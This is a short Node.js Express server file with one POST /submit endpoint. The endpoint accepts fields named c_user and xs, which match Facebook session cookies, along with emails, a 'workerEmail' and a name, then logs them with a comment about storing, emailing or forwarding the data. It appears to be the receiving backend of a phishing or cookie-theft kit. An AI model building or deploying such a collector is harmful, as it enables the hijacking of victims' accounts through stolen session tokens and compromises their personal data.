// index.js (or app.js)
const express = require('express');
const app = express();

app.use(express.json());

app.post('/submit', (req, res) => {
  const { c_user, xs, emails, workerEmail, name } = req.body;
  console.log("Received:", { c_user, xs, emails, workerEmail, name });

  // Do something with data (store, email, forward)
  res.status(200).json({ success: true });
});

module.exports = app;
